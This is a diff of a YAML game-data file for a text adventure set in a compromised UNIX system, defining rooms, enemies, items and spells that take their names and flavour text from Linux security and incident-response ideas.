+  # /srv and /mnt — service data and mounts (4 rooms)
+  # ===========================================================================
+
+  srv:
+    name: "/srv"
+    description_seed: "Service data. Git repositories and Docker volumes. The git repos contain source code with hardcoded secrets. The Docker socket is world-readable — container escape is trivial."
+    connections:
+      north: {room: root_fs, type: open}
+      east: {room: srv_git, type: open}
+      west: {room: srv_docker, type: open}
+
+  srv_git:
+    name: "/srv/git"
+    description_seed: "Bare git repositories. The application source code, deployment scripts, infrastructure-as-code. A git log shows the attacker committed a backdoor to the deployment script — it runs on every deploy."
+    connections:
+      west: {room: srv, type: open}
+
+  srv_docker:
+    name: "/srv/docker"
+    description_seed: "Docker volumes and configuration. The docker.sock is world-readable. Container images include one labeled 'miner' — a cryptocurrency mining container that starts automatically. A Container Shell sits unused."
+    connections:
+      east: {room: srv, type: open}
+    items: [container_shell]
+
+  # ===========================================================================
+  # /root — root's home (5 rooms, locked until sudo_token obtained)
+  # ===========================================================================
+
+  root_home:
+    name: "/root"
+    description_seed: "Root's home directory. The inner sanctum. Clean, sparse, powerful. A Chmod Hammer hangs above the desk — the root user's weapon of choice. .ssh holds keys to every server on the network. The Daemon King stands guard."
+    connections:
+      north: {room: root_fs, type: locked}
+      east: {room: root_ssh, type: open}
+      south: {room: root_scripts, type: open}
+    enemies: [daemon_king]
+    items: [chmod_hammer]
+
+  root_ssh:
+    name: "/root/.ssh"
+    description_seed: "Root's SSH keys. The master keys. authorized_keys, known_hosts, and private keys for every server in the infrastructure. The root SSH key unlocks the database server."
+    connections:
+      west: {room: root_home, type: open}
+    items: [root_ssh_key]
+
+  root_scripts:
+    name: "/root/scripts"
+    description_seed: "Root's administrative scripts. Backup, restore, nuke-from-orbit. The incident response script is more thorough than admin's version. A 'hardening.sh' script would fix most of the system's vulnerabilities if run."
+    connections:
+      north: {room: root_home, type: open}
+    items: [hardening_script]
+
+  root_bashrc:
+    name: "/root/.bashrc"
+    description_seed: "Root's shell configuration. Unlike guest's .bashrc, this one is clean — no injected commands. The PATH includes /usr/local/sbin, /usr/sbin, /sbin. Proper root paths."
+    connections:
+      east: {room: root_home, type: open}
+
+  root_shell_room:
+    name: "The Root Shell"
+    description_seed: "The Root Shell glows before you — root@catacombs:~# — Welcome, superuser. The system bends to your will. With root access and the hardening script, you can secure this system. But the attackers are still out there, on other hosts."
+    connections:
+      north: {room: root_home, type: open}
+    items: [root_shell]
+
+# =============================================================================
+# ENEMIES
+# =============================================================================
+
 enemies:
+  # Tier 1 — Nuisance
   segfault_daemon:
     name: "Segfault Daemon"
-    hp: 15
+    hp: 12
+    attack: "1d4"
+    ai: aggressive
+
+  zombie_process:
+    name: "Zombie Process"
+    hp: 8
+    attack: "1d4"
+    ai: cautious
+
+  zombie_process_2:
+    name: "Zombie Process"
+    hp: 8
+    attack: "1d4"
+    ai: cautious
+
+  fork_bomb:
+    name: "Fork Bomb"
+    hp: 18
     attack: "1d6"
     ai: aggressive
 
+  stale_lock:
+    name: "Stale Lock"
+    hp: 6
+    attack: "1d3"
+    ai: cautious
+
+  log_rotator:
+    name: "Log Rotator"
+    hp: 10
+    attack: "1d4"
+    ai: aggressive
+
+  # Tier 2 — Threats
   oom_killer:
     name: "OOM Killer"
     hp: 25
     attack: "1d8+2"
     ai: aggressive
 
-  null_byte:
-    name: "Null Byte"
-    hp: 5
-    attack: "1d4"
+  rootkit:
+    name: "Rootkit"
+    hp: 20
+    attack: "1d6+2"
     ai: cautious
 
-spells:
-  fireball:
-    name: Fireball
-    mp: 3
-    effect: damage
-    power: "2d6"
-    classes: [mage, priest]
-  heal:
-    name: Heal
-    mp: 2
-    effect: heal
-    power: "1d6+2"
-    classes: [priest, mage]
+  trojan_binary:
+    name: "Trojan Binary"
+    hp: 15
+    attack: "1d6"
+    ai: aggressive
+
+  cron_backdoor:
+    name: "Cron Backdoor"
+    hp: 18
+    attack: "1d6+1"
+    ai: aggressive
+
+  rogue_ssh_agent:
+    name: "Rogue SSH Agent"
+    hp: 22
+    attack: "1d8"
+    ai: aggressive
+
+  rogue_ssh_agent_2:
+    name: "Rogue SSH Agent"
+    hp: 22
+    attack: "1d8"
+    ai: aggressive
+
+  # Bosses
+  null_byte:
+    name: "Null Byte"
+    hp: 30
+    attack: "1d8+1"
+    ai: aggressive
+
+  kernel_panic:
+    name: "Kernel Panic"
+    hp: 35
+    attack: "2d6"
+    ai: aggressive
+
+  daemon_king:
+    name: "The Daemon King"
+    hp: 45
+    attack: "2d8+2"
+    ai: aggressive
+
+# =============================================================================
+# ITEMS
+# =============================================================================
 
 items:
-  man_page:
-    name: "Man Page"
-    description: "man survival(7) — In the UNIX Catacombs, every process has a PID and a purpose. Find the Root Shell before the OOM Killer finds you. Pipes connect all things. stderr is your friend."
-    type: misc
-    weight: 0.1
-    value: 0
+  # Weapons
+  kill_nine:
+    name: "Kill Nine"
+    description: "The ultimate signal — kill -9. SIGKILL. No process can catch it, no process can ignore it. Unceremonious but effective."
+    type: weapon
+    damage: "1d8+1"
+    weight: 1.0
+    value: 25
 
+  strace_blade:
+    name: "Strace Blade"
+    description: "A system call tracer forged into a blade. Each strike exposes the target's internal state — file descriptors, memory maps, signal handlers."
+    type: weapon
+    damage: "1d6+2"
+    weight: 1.5
+    value: 30
+
+  gdb_debugger:
+    name: "GDB Debugger"
+    description: "The GNU Debugger. Heavy, slow, devastatingly powerful. Set breakpoints in your enemies. Examine their memory. Change their variables. Few can withstand a full debug session."
+    type: weapon
+    damage: "1d10"
+    weight: 3.0
+    value: 50
+
+  chmod_hammer:
+    name: "Chmod Hammer"
+    description: "Root's weapon of choice. chmod 000 — remove all permissions. chmod 777 — grant everything. The hammer swings both ways."
+    type: weapon
+    damage: "1d8+3"
+    weight: 2.0
+    value: 60
+
+  # Armor
   alias_shield:
     name: "Alias Shield"
     description: "Sourced from .bashrc. The alias 'shield=deflect -a' wraps around you like armor, deflecting the worst of incoming signals."
@@ -153,38 +881,227 @@ items:
     weight: 2.0
     value: 15
 
-  pipe_connector:
-    name: "Pipe Connector"
-    description: "Wrenched from the ground in /tmp. A mystery.pipe that could connect to anything — or unlock sealed gates."
-    type: key
-    weight: 0.5
-    value: 5
+  chroot_jail:
+    name: "Chroot Jail"
+    description: "Portable filesystem isolation. Locks you into a restricted root — attacks from outside the chroot can't reach you."
+    type: armor
+    weight: 3.0
+    value: 35
 
+  container_shell:
+    name: "Container Shell"
+    description: "A lightweight Docker container. Namespace isolation protects you from most system-level attacks. Not as strong as chroot, but more flexible."
+    type: armor
+    weight: 1.5
+    value: 25
+
+  iptables_shield:
+    name: "Iptables Shield"
+    description: "A restored firewall ruleset. INPUT: DROP all except established. FORWARD: DROP. OUTPUT: ACCEPT. Wearing this blocks incoming attacks."
+    type: ring
+    weight: 0.5
+    value: 40
+
+  # Amulets
   grep_tool:
     name: "Grep Tool"
-    description: "A powerful pattern-matching tool from /var/log. With this, you can search for weaknesses in any process."
+    description: "A powerful pattern-matching tool. With this, you can search for weaknesses in any process — and reveal hidden enemies like rootkits."
     type: amulet
     weight: 0.3
     value: 20
 
-  kill_nine:
-    name: "Kill Nine"
-    description: "The ultimate signal — the infamous 'kill -9'. SIGKILL. No process can catch it, no process can ignore it. Unceremonious but effective."
-    type: weapon
-    damage: "1d8+1"
-    weight: 1.0
-    value: 25
+  # Keys and quest items
+  man_page:
+    name: "Man Page"
+    description: "man survival(7) — In the UNIX Catacombs, you are a process on a compromised system. Explore the filesystem, find the threat, clean the system, trace the attacker. Trust no binary. Read the logs. Find root."
+    type: misc
+    weight: 0.1
+    value: 0
+
+  pipe_connector:
+    name: "Pipe Connector"
+    description: "A UNIX pipe fragment from /tmp. Could connect processes or unlock sealed pipe gates."
+    type: key
+    weight: 0.5
+    value: 5
+
+  shadow_file:
+    name: "Shadow File"
+    description: "A copy of /etc/shadow. Password hashes for every user on the system. Can crack passwords and unlock areas that require authentication."
+    type: key
+    weight: 0.1
+    value: 50
+
+  sudo_token:
+    name: "Sudo Token"
+    description: "A temporary privilege escalation token obtained from the PAM configuration. Grants access to /root."
+    type: key
+    weight: 0.0
+    value: 75
+
+  admin_ssh_key:
+    name: "Admin SSH Key"
+    description: "The administrator's private SSH key. Grants access to the web server via SSH."
+    type: key
+    weight: 0.1
+    value: 40
+
+  root_ssh_key:
+    name: "Root SSH Key"
+    description: "Root's private SSH key. Grants access to the database server via SSH."
+    type: key
+    weight: 0.1
+    value: 60
+
+  dev_ssh_key:
+    name: "Dev SSH Key"
+    description: "The developer's private SSH key. Unencrypted. Grants access to the build server."
+    type: key
+    weight: 0.1
+    value: 40
 
   root_shell:
     name: "Root Shell"
-    description: "A glowing terminal prompt pulsing with # instead of $. You are root. The system is yours."
+    description: "root@catacombs:~# — You are root. The system is yours. With this, you can execute the hardening script and secure the system."
     type: amulet
     weight: 0.0
     value: 100
 
-  shadow_file:
-    name: "Shadow File"
-    description: "A copy of /etc/shadow. Password hashes for every user on the system. Knowledge is power."
+  security_notice:
+    name: "Security Notice"
+    description: "URGENT: Suspicious activity detected by monitoring. Outbound connections to known C2 IP. New user account 'backdoor' created. Investigate immediately. — Monitoring System, 72h ago"
     type: misc
     weight: 0.1
-    value: 50
+    value: 5
+
+  attacker_notes:
+    name: "Attacker Notes"
+    description: "Handwritten notes from the attacker's staging directory. Timeline: Day 1 — exploit legacy app, create backdoor user. Day 2 — install rootkit, trojan binaries, set up persistence. Day 3 — exfiltrate data, pivot to other hosts."
+    type: misc
+    weight: 0.1
+    value: 30
+
+  rogue_ssh_key:
+    name: "Rogue SSH Key"
+    description: "The attacker's SSH public key, found in /etc/ssh/authorized_keys. Comment: 'persistence@c2.darknet.onion'. Removing this revokes the attacker's key-based access."
+    type: misc
+    weight: 0.0
+    value: 15
+
+  grub_config:
+    name: "GRUB Config"
+    description: "A modified grub.cfg with a boot entry that drops to a root shell without authentication. Another persistence mechanism."
+    type: misc
+    weight: 0.1
+    value: 10
+
+  ir_script:
+    name: "Incident Response Script"
+    description: "Admin's incident response script. Collects logs, checksums binaries, checks for IOCs. Running it would generate a comprehensive report of the compromise."
+    type: misc
+    weight: 0.2
+    value: 20
+
+  hardening_script:
+    name: "Hardening Script"
+    description: "Root's system hardening script. Removes backdoor accounts, restores firewall rules, disables unnecessary services, enables ASLR, blocks module loading. The cure for this system."
+    type: misc
+    weight: 0.2
+    value: 80
+
+  real_ls:
+    name: "Real ls"
+    description: "The original, untrojaned /usr/bin/ls. Backed up at .ls.bak before the attacker replaced it. Shows hidden attacker files that the trojaned version filters out."
+    type: misc
+    weight: 0.5
+    value: 15
+
+  exploit_payload:
+    name: "Exploit Payload"
+    description: "A compiled exploit from the attacker's staging area in /tmp/.hidden. Targets the legacy application's deserialization vulnerability. Could be useful... or dangerous."
+    type: misc
+    weight: 0.3
+    value: 25
+
+  web_shell_evidence:
+    name: "Web Shell Evidence"
+    description: "A copy of the upload.php web shell found in /var/www/html. Simple PHP backdoor that executes arbitrary commands. Evidence of the attacker's access method."
+    type: misc
+    weight: 0.1
+    value: 10
+
+  db_credentials:
+    name: "Database Credentials"
+    description: "Plaintext database credentials from the legacy app's configuration: root:P@ssw0rd123. The same password works for MySQL, the admin panel, and probably the database server."
+    type: key
+    weight: 0.0
+    value: 35
+
+  # Consumables
+  core_dump:
+    name: "Core Dump"
+    description: "A fresh core dump from a crashed process. Still warm. Analyzing it reveals useful information about the system state. Restores vitality."
+    type: consumable
+    weight: 1.0
+    value: 5
+
+  core_dump_2:
+    name: "Core Dump"
+    description: "Another core dump. This system crashes a lot. At least they're nutritious."
+    type: consumable
+    weight: 1.0
+    value: 5
+
+  entropy_potion:
+    name: "Entropy Potion"
+    description: "Crystallized randomness from /dev/random. Restores magical energy. Tastes like static."
+    type: consumable
+    weight: 0.3
+    value: 10
+
+  entropy_potion_2:
+    name: "Entropy Potion"
+    description: "More crystallized entropy. The pool is generous today."
+    type: consumable
+    weight: 0.3
+    value: 10
+
+# =============================================================================
+# SPELLS
+# =============================================================================
+
+spells:
+  fireball:
+    name: "rm -rf"
+    mp: 3
+    effect: damage
+    power: "2d6"
+    classes: [mage, priest]
+
+  heal:
+    name: "fsck"
+    mp: 2
+    effect: heal
+    power: "1d6+2"
+    classes: [priest, mage]
+
+  scan:
+    name: "nmap"
+    mp: 2
+    effect: damage
+    power: "1d4"
+    classes: [mage]
+
+  patch:
+    name: "apt upgrade"
+    mp: 4
+    effect: heal
+    power: "2d6"
+    classes: [priest]
+
+  exploit:
+    name: "metasploit"
+    mp: 5
+    effect: damage
+    power: "3d6"
+    classes: [mage]
